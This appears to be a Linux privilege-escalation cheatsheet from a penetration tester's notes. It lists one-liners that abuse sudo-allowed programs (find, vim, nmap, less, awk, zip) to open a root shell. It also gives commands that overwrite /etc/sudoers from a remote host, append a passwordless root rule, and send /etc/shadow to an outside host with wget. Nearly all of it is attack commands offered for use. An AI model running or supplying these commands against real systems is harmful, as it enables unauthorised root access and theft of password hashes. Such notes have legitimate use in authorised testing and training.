# PrivEsc Cheatsheet

## Get Cron Jobs of all users
(where possible)
```
for user in $(getent passwd | cut -f1 -d: ); do echo $user; crontab -u $user -l; done
```

## Available Commands

"List the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host"

```
sudo -l
```

### Find

```
sudo find /etc/passwd -exec /bin/sh \;
```

### Vim

```
sudo vim -c '!sh'
```

### nmap (old)

```
sudo nmap --interactive
nmap> !sh
```

### nmap (new)
```
echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
```

### man

```
sudo man man
!sh
```

### more/less

```
sudo less /etc/hosts
!sh

sudo more /etc/hosts
!sh
```

### awk

```
sudo awk 'BEGIN {system("/bin/sh")}'
```

### wget

```
sudo wget http://<HOST>:<PORT>/sudoers -O /etc/sudoers
```

Read file:

```
sudo wget --post-file=/etc/shadow <HOST>
```

### apache

```
sudo apache2 -f /etc/shadow
```

## Writeable `/etc/sudoers`
Append:
```
<username>      ALL = NOPASSWD: ALL
```

# zip
```
sudo -u root /usr/bin/zip ttt.zip tt.php -T –unzip-command=”sh -c /bin/bash”
```

# chown
Check `chown_chmod_tar_rsync.md`.

# chmod
Check `chown_chmod_tar_rsync.md`.

# tar
Check `chown_chmod_tar_rsync.md`.

# rsync
Check `chown_chmod_tar_rsync.md`.


# Resources
- [Abusing SUDO (Linux Privilege Escalation)](http://touhidshaikh.com/blog/?p=790)
